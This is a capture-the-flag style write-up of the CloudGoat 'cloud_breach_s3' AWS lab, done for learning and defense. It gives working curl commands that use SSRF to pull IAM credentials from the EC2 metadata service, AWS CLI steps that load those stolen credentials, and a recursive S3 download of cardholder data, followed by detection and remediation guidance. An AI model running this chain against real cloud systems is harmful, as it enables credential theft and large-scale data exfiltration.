# CloudGoat Lab: cloud_breach_s3
### SSRF → IAM Credential Theft → S3 Exfiltration

**Platform:** [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat) by Rhino Security Labs  
**Difficulty:** Easy  
**Author:** Justin Steele

---

## Background

I put this lab together to get hands-on with a real AWS attack chain — specifically the SSRF to metadata credential theft pattern used in the 2019 Capital One breach. I wanted to understand not just how the attack works mechanically, but what it looks like from a defender's perspective and where the detection opportunities are.

CloudGoat spins up a deliberately vulnerable AWS environment using Terraform. The scenario here is `cloud_breach_s3` — there's an EC2 instance running a web app with an SSRF vulnerability, an IAM role attached to that instance with way too many permissions, and an S3 bucket full of sensitive cardholder data. The goal is to chain those three things together and exfiltrate the data.

---

## Environment

| Resource | Value |
|----------|-------|
| Target EC2 IP | `3.239.172.114` |
| IAM Role discovered | `cg-banking-WAF-Role-cgidspnmtej823` |
| S3 Bucket | `cg-cardholder-data-bucket-cgidspnmtej823` |
| Data exfiltrated | 3 CSVs — 1,500+ records of SSNs, PII, and plaintext corporate passwords |

---

## Attack Chain

```
SSRF vulnerability
      ↓
EC2 Metadata Service (169.254.169.254)
      ↓
Stolen IAM credentials (AccessKeyId + SecretAccessKey + SessionToken)
      ↓
S3 bucket enumeration
      ↓
Full data exfiltration
```

---

## Walkthrough

### Step 1 — Reconnaissance

First thing I did was hit the server to see what it returned:

```bash
curl http://3.239.172.114
```

The response was telling — the server said it was configured to proxy requests to the EC2 metadata service if you modify the `Host` header. That's a textbook SSRF setup. In a real engagement you'd find this through parameter fuzzing or Burp Suite, but the concept is the same.

---

### Step 2 — SSRF → IMDS

The EC2 metadata service runs at `169.254.169.254` and is only reachable from inside the instance. But since this app blindly proxies requests based on the Host header, I could make it talk to its own metadata endpoint on my behalf:

```bash
curl http://3.239.172.114/latest/meta-data/iam/security-credentials/ \
  -H "Host: 169.254.169.254"
```

**Response:** `cg-banking-WAF-Role-cgidspnmtej823`

The role name says WAF — supposed to be a Web Application Firewall service account. It had no business reading S3 cardholder data, but that's the misconfiguration we're exploiting.

---

### Step 3 — Credential Theft

With the role name I requested the actual temporary credentials AWS vends to the instance through IMDS:

```bash
curl http://3.239.172.114/latest/meta-data/iam/security-credentials/cg-banking-WAF-Role-cgidspnmtej823 \
  -H "Host: 169.254.169.254"
```

**Response:**
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "ASIATIAN52TU7ID6UPKJ",
  "SecretAccessKey": "[REDACTED]",
  "Token": "[REDACTED]",
  "Expiration": "~6 hours"
}
```

Real, live AWS credentials — valid for about 6 hours. At this point I could impersonate that IAM role from my own machine.

---

### Step 4 — Lateral Movement

Loaded the credentials into a local AWS CLI profile:

```bash
aws configure set aws_access_key_id ASIATIAN52TU7ID6UPKJ --profile stolen
aws configure set aws_secret_access_key [REDACTED] --profile stolen
aws configure set aws_session_token [REDACTED] --profile stolen
aws configure set region us-east-1 --profile stolen
```

I keep these isolated in a named profile so I can easily distinguish stolen vs. legitimate credentials during the lab.

---

### Step 5 — S3 Enumeration

```bash
aws s3 ls --profile stolen
```

One bucket: **`cg-cardholder-data-bucket-cgidspnmtej823`**

The name alone is a red flag — a WAF role that can list and read a cardholder data bucket is a massive over-permission. This is exactly what a quarterly IAM access review should catch.

---

### Step 6 — Data Exfiltration

```bash
aws s3 cp s3://cg-cardholder-data-bucket-cgidspnmtej823/ . --recursive --profile stolen
```

Three files came down:

| File | Contents |
|------|----------|
| `cardholder_data_primary.csv` | 500 records — SSNs, full names, home addresses, email addresses |
| `cardholder_data_secondary.csv` | Additional cardholder PII |
| `cardholders_corporate.csv` | 1,000 corporate accounts with **plaintext passwords** |

The corporate password file is the worst of it. In a real breach, this is the file that ends up for sale.

---

## Real-World Impact

This attack chain simultaneously hits multiple compliance frameworks:

- **PCI-DSS** — cardholder data exposed
- **GDPR / CCPA** — PII with no encryption
- **SOX** — depending on the org

The Capital One breach (2019) used essentially this same path — SSRF on an EC2 instance running a misconfigured WAF, credentials stolen from IMDS, 100M+ customer records exfiltrated. Result: $190M settlement and the CISO resigned.

---

## Detection

### GuardDuty
Would fire **`UnauthorizedAccess:IAMUser/InstanceCredentialExfiltration`** the moment the stolen credentials were used from outside the EC2 instance. This is the single fastest win — enable GuardDuty and this attack gets caught fast.

### CloudTrail + CloudWatch
Every S3 API call shows up in CloudTrail with the source IP of the attacker's machine, not the EC2 instance. A metric filter catches the exfiltration:

```bash
aws logs put-metric-filter \
  --filter-pattern '{ $.eventName = "GetObject" && $.requestParameters.bucketName = "*cardholder*" }' \
  --metric-transformations metricName=CardholderS3Access,metricNamespace=Security,metricValue=1
```

### IMDSv2 Enforcement
The most impactful fix — IMDSv2 requires a PUT request to get a session token before any metadata can be read. SSRF vulnerabilities can't make PUT requests the same way, so this breaks the attack at Step 2:

```bash
aws ec2 modify-instance-metadata-options \
  --instance-id i-xxxxxxxxxx \
  --http-tokens required \
  --http-endpoint enabled
```

Enforce org-wide with an AWS Config rule (`ec2-imdsv2-check`) or an SCP on RunInstances.

---

## Remediation

| Priority | Fix |
|----------|-----|
| 🔴 Critical | Enforce IMDSv2 on all EC2 instances — kills this attack class entirely |
| 🔴 Critical | Fix the SSRF — validate and whitelist allowed outbound URLs, reject requests to `169.254.0.0/16` |
| 🟠 High | Scope down IAM roles — WAF roles should never have `s3:GetObject` on sensitive data |
| 🟠 High | Enable GuardDuty — detects credential exfiltration out of the box |
| 🟡 Medium | Add S3 bucket policies restricting access to specific VPC endpoints |
| 🟡 Medium | Encrypt S3 objects with KMS; restrict key usage to specific principals |
| 🟡 Medium | Enable S3 access logging and alert on anomalous download volume |

---

## What I Took Away

The thing that stood out most wasn't the SSRF itself — it's how many layers of misconfiguration had to stack up for this to work. The SSRF is the entry point, but the real damage comes from everything else: IMDSv1 still enabled, an overly permissive IAM role, no S3 bucket policy, sensitive data sitting unencrypted.

Remove any one of those and the attack either fails or the blast radius is dramatically reduced.

From a blue team standpoint, this entire attack lights up GuardDuty. If you have it enabled and someone is actually watching the alerts, this gets caught fast. The lesson: detection controls matter as much as prevention.

---

## Tools Used

- [CloudGoat](https://github.com/RhinoSecurityLabs/cloudgoat) — vulnerable-by-design AWS environment
- Terraform — infrastructure provisioning
- AWS CLI — enumeration and exfiltration
- curl — SSRF exploitation

---

*Built on CloudGoat by Rhino Security Labs. Scenario: `cloud_breach_s3`.*
